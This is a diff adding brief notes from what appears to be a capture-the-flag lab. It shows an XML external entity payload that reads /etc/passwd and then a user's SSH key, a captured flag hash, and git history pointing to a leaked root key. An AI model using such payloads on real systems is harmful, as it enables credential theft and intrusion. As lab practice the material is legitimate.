@@ -1,0 +1,36 @@
+notes:
+uploading an example code exection cml file reveals a user called roosa.
+we can read /etc/passwd so lets try read the ssh ke
+load this in burpe by just uploading test.txt
+<test>
+  <Author>fieldraccoon</Author>
+  <Subject>fieldraccoon</Subject>
+  <Content>fieldraccoon</Content>
+</test>
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+
+<test>
+  <Author>fieldraccoon</Author>
+  <Subject>&file;</Subject>
+  <Content>fieldraccoon</Content>
+</test>
+
+then cahnge the file to the ssh key for roosa and we get the key
+user: c5808e1643e801d40f09ed87cdecc67b
+
+there is a git directory in /home/roosa/work/blogfeed/.git
+running git log we find 
+commit 33e87c312c08735a02fa9c796021a4a3023129ad
+Author: Roosa Hakkerson <roosa@solita.fi>
+Date:   Mon Mar 19 09:33:06 2018 -0400
+
+    reverted accidental commit with proper key
+this means that if we access that key it might be the root key that we can ssh with
+git log --name-only --oneline                                                                                                                                                                                                              
+                                                                                                                                                                                                                                           
+we can also just cat this file to find the key
